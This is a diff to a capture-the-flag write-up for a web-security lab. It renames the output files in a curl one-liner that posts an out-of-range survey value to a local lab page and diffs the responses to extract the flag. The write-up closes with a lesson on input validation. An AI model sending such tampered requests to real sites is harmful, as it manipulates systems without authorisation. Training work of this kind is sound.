@@ -14,7 +14,7 @@ The "valeur" element also has an onchange JavaScript attribute, which automatica
 ## Flag
 If a POST request is submitted with the "valeur" value greater than 10, the page will display the flag.
 
-```curl -s 'http://192.168.99.101/index.php?page=survey' --data 'sujet=2&valeur=10'  -o before.html && curl -s 'http://192.168.99.101/index.php?page=survey' --data 'sujet=2&valeur=110'  -o after.html && diff before.html after.html | sed 's/.*flag is \(.*\)<\/h2>.*/\1/' > flag```
+```curl -s 'http://192.168.99.101/index.php?page=survey' --data 'sujet=2&valeur=10'  -o _10.html && curl -s 'http://192.168.99.101/index.php?page=survey' --data 'sujet=2&valeur=110'  -o _110.html && diff _10.html _110.html | sed 's/.*flag is \(.*\)<\/h2>.*/\1/' > flag```
 
 ## Key Takeaway
 The key takeaway from this experience is the importance of data sanitization and validation to prevent potential security vulnerabilities. Whether variables are passed in the URL through a GET request or through a more complex POST request, proper measures should be taken to ensure the accuracy and safety of user data.</br>
